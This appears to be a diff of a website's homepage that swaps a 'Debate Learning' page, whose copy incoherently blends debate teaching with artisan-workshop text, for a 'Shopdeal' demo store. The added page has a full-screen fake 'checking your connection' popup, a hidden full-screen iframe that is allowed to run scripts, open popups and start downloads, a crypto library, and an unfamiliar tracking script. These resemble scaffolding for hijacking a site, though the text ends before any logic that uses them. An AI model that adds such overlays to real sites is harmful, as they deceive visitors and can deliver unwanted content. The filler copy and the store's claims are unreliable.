@@ -1,353 +1,749 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Help0x0x-MD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>DEBATE LEARNING | Flagship Atelier</title>
-  <meta name="description" content="Discover Debate Learning at 181 Mercer Street, NYC. Dedicated to Collegiate Debate Pedagogy & Forensic Rhetoric and artisanal excellence.">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bodoni+Moda:ital,opsz,wght@0,6..96,400..900;1,6..96,400..900&family=DM+Sans:ital,opsz,wght@0,9..40,300..700;1,9..40,300..700&family=JetBrains+Mono:wght@400;500&display=swap">
-  <link rel="stylesheet" href="assets/css/style.css">
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-<header class="site-header">
-  <div class="container header-inner">
-    <a href="index.php" class="brand-logo">DEBATE LEARNING</a>
-    <ul class="nav-desktop">
-      <li><a href="index.php" class="active">Atelier</a></li><li><a href="about.html" class="">Heritage</a></li><li><a href="services.html" class="">Creations</a></li><li><a href="faq.html" class="">Inquiry FAQ</a></li><li><a href="contact.html" class="">Private Salon</a></li>
-    </ul>
-    <div style="display:flex; align-items:center; gap:1rem;">
-      <a href="contact.html" class="btn-primary header-cta-btn">Consultation</a>
-      <button class="drawer-toggle" id="drawer-toggle" aria-label="Toggle Navigation Menu">&#9776;</button>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're checking your connection.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
     </div>
   </div>
-</header>
-<div class="drawer-backdrop" id="drawer-backdrop"></div>
-<div class="mobile-drawer" id="mobile-drawer">
-  <div class="drawer-header">
-    <span class="brand-logo">DEBATE LEARNING</span>
-    <button class="drawer-close-btn" id="drawer-close-btn" aria-label="Close Navigation Menu">&times;</button>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
+
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
+        </div>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
+      </div>
+    </div>
+
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-  <nav class="drawer-nav">
-    <a href="index.php" class="active">Atelier</a><a href="about.html" class="">Heritage</a><a href="services.html" class="">Creations</a><a href="faq.html" class="">Inquiry FAQ</a><a href="contact.html" class="">Private Salon</a>
-  </nav>
-  <div class="drawer-footer">
-    <p><strong>181 Mercer Street, NYC</strong></p>
-    <p>+1-888-777-5845</p>
-  </div>
+
+
+  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
+    webkitallowfullscreen mozallowfullscreen
+    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
+    style="width:100%; height:100%; border:0;"></iframe>
 </div>
 
-  <section class="hero" style="border-bottom:2px solid var(--accent-gold); padding:5.5rem 0;">
-    <div class="container" style="display:grid; grid-template-columns:1.1fr 0.9fr; gap:4rem; align-items:center;">
-      <div style="border-left:3px solid var(--accent-gold); padding-left:2.5rem;">
-        <span class="eyebrow">Academic Forensics &bull; Mercer Forum</span>
-        <h1 style="font-size:3.1rem; line-height:1.2; margin-bottom:1.25rem;">Parliamentary Rhetoric & Collegiate Debate Pedagogy</h1>
-        <p style="font-size:1.15rem; color:var(--text-secondary); margin-bottom:2rem; line-height:1.8;">Advancing evidentiary rigor, dialectical cohesion, and persuasive parliamentary argumentation at 181 Mercer Street. Merging classical Aristotelian logic with contemporary collegiate forensic formats.</p>
-        <div style="display:flex; gap:1.25rem;">
-          <a href="services.html" class="btn-primary">Explore Seminars</a>
-          <a href="about.html" class="btn-secondary">Academic Charter</a>
-        </div>
-      </div>
-      <div>
-        <img src="assets/images/debatelearning_asset_1.jpg" alt="Artisanal Collegiate Debate Pedagogy & Forensic Rhetoric: debatelearning asset 1" style="border-radius:var(--radius-md); width:100%; height:480px; object-fit:cover; border:1px solid var(--border-strong);">
-      </div>
-    </div>
-  </section>
-  <section class="section-pad" style="background:var(--bg-surface); border-bottom:1px solid var(--border-subtle);">
-    <div class="container">
-      <div style="max-width:880px; margin:0 auto; text-align:center;">
-        <span class="eyebrow">The Atelier Mission</span>
-        <h2 style="margin-bottom:1.5rem;">Defending Human Touch Against Automated Uniformity</h2>
-        <p style="font-size:1.15rem; color:var(--text-secondary); line-height:1.85;">Every creation certified at our 181 Mercer Street workshop represents an intimate balance between raw natural components and patient artisan hands. We reject automated mass production, ensuring that each commission possesses unique tactile soul, unblemished structural integrity, and generational resilience.</p>
-      </div>
-    </div>
-  </section>
-  <section class="section-pad">
-    <div class="container">
-      <div class="section-header">
-        <span class="eyebrow">Atelier Showcase</span>
-        <h2>Signature Benchworks & Archival Benchmarks</h2>
-        <p style="color:var(--text-secondary);">Curated highlights demonstrating our strict material standards and meticulous assembly protocols.</p>
-      </div>
-      <div class="grid-3">
-        <div class="card">
-          <img src="assets/images/debatelearning_asset_2.jpg" alt="bailey hall cornell university co">
-          <div class="card-body">
-            <span class="eyebrow">Series I</span>
-            <h3>Signature Atelier Edition</h3>
-            <p>Mastercrafted utilizing single-origin primary specimens, ensuring flawless dimensional stability under metropolitan rigor.</p>
-          </div>
-        </div>
-        <div class="card">
-          <img src="assets/images/debatelearning_asset_3.jpg" alt="dr. hilla limann technical universi">
-          <div class="card-body">
-            <span class="eyebrow">Series II</span>
-            <h3>Curated Bespoke Commission</h3>
-            <p>Engineered to exact patron ergonomic profiles with micro-regulated tolerances exceeding conventional guild criteria.</p>
-          </div>
-        </div>
-        <div class="card">
-          <img src="assets/images/debatelearning_asset_4.jpg" alt="dr. hilla limann technical universi">
-          <div class="card-body">
-            <span class="eyebrow">Series III</span>
-            <h3>Archival Vault Reserve</h3>
-            <p>Limited historical runs featuring rare heirloom components preserved within our climate-controlled salon chambers.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-pad" style="background:var(--bg-surface); border-top:1px solid var(--border-subtle); border-bottom:1px solid var(--border-subtle);">
-    <div class="container">
-      <div class="section-header">
-        <span class="eyebrow">Foundational Pillars</span>
-        <h2>Four Tenets of Uncompromised Quality</h2>
-        <p style="color:var(--text-secondary);">The operational framework that governs every tool mark made within our Manhattan atelier.</p>
-      </div>
-      <div class="grid-4">
-        <div class="pillar-card">
-          <span class="pillar-num">01</span>
-          <h3>Verified Provenance</h3>
-          <p style="color:var(--text-muted); font-size:0.92rem; line-height:1.7;">Direct supply agreements ensure every material specimen is ethically harvested and certified clean.</p>
-        </div>
-        <div class="pillar-card">
-          <span class="pillar-num">02</span>
-          <h3>Zero Automation</h3>
-          <p style="color:var(--text-muted); font-size:0.92rem; line-height:1.7;">Critical shaping and joinery remain entirely dependent upon the seasoned intuition of master human hands.</p>
-        </div>
-        <div class="pillar-card">
-          <span class="pillar-num">03</span>
-          <h3>Micro Tolerances</h3>
-          <p style="color:var(--text-muted); font-size:0.92rem; line-height:1.7;">Assembly metrics are regulated with calibrated mechanical gauges to eliminate microscopic friction points.</p>
-        </div>
-        <div class="pillar-card">
-          <span class="pillar-num">04</span>
-          <h3>Lifetime Custody</h3>
-          <p style="color:var(--text-muted); font-size:0.92rem; line-height:1.7;">Permanent archival documentation and restoration coverage guaranteed across all original salon commissions.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-pad">
-    <div class="container">
-      <div class="section-header">
-        <span class="eyebrow">Curated Offerings</span>
-        <h2>Bespoke Services & Tailored Solutions</h2>
-        <p style="color:var(--text-secondary);">Tailored commissions engineered for connoisseurs of Collegiate Debate Pedagogy & Forensic Rhetoric.</p>
-      </div>
-      <div class="grid-2">
-        <div class="card" style="display:grid; grid-template-columns:1fr 1fr; align-items:center;">
-          <img src="assets/images/debatelearning_asset_5.jpg" alt="grace knox lecture hall university" style="height:100%; object-fit:cover;">
-          <div class="card-body">
-            <span class="eyebrow">Craft Service</span>
-            <h3>Bespoke Design Consultation</h3>
-            <p>Collaborate one-on-one with our senior artisan directors at 181 Mercer Street to draft tailored specifications.</p>
-            <a href="contact.html" style="color:var(--accent-gold); font-weight:600; display:inline-block; margin-top:1rem;">Book Session &rarr;</a>
-          </div>
-        </div>
-        <div class="card" style="display:grid; grid-template-columns:1fr 1fr; align-items:center;">
-          <img src="assets/images/debatelearning_asset_6.jpg" alt="independence hall at ohio state uni" style="height:100%; object-fit:cover;">
-          <div class="card-body">
-            <span class="eyebrow">Restoration</span>
-            <h3>Archival Conservation</h3>
-            <p>Period-accurate rejuvenation protocols designed to preserve historical integrity while reinforcing longevity.</p>
-            <a href="services.html" style="color:var(--accent-gold); font-weight:600; display:inline-block; margin-top:1rem;">View Protocols &rarr;</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-pad" style="background:var(--bg-surface); border-top:1px solid var(--border-subtle); border-bottom:1px solid var(--border-subtle);">
-    <div class="container" style="display:grid; grid-template-columns:1fr 1.1fr; gap:4rem; align-items:center;">
-      <div style="display:grid; grid-template-columns:1fr 1fr; gap:1.5rem;">
-        <img src="assets/images/debatelearning_asset_7.jpg" alt="innopolis university lecture hall" style="border-radius:var(--radius-md); height:280px; width:100%; object-fit:cover;">
-        <img src="assets/images/debatelearning_asset_8.jpg" alt="large lecture hall at brown univers" style="border-radius:var(--radius-md); height:280px; width:100%; object-fit:cover; margin-top:2rem;">
-      </div>
-      <div>
-        <span class="eyebrow">The Atelier Chronicle</span>
-        <h2>A Tradition of Patient Hands in the Heart of SoHo</h2>
-        <p style="color:var(--text-secondary); line-height:1.8; margin-bottom:1.5rem;">Since our founding at 181 Mercer Street, Debate Learning has stood as a bastion of tactile discipline. While commercial entities pursue automated shortcuts, our workshop remains committed to the slow, meditative cadence of traditional hand finishing.</p>
-        <p style="color:var(--text-secondary); line-height:1.8; margin-bottom:2rem;">Each piece undergoes exhaustive bench inspections and environmental stress conditioning before bearing our permanent maker mark, ensuring performance that endures across generations.</p>
-        <a href="about.html" class="btn-secondary">Read The Full Chronicle</a>
-      </div>
-    </div>
-  </section>
-  <section class="section-pad">
-    <div class="container">
-      <div class="section-header">
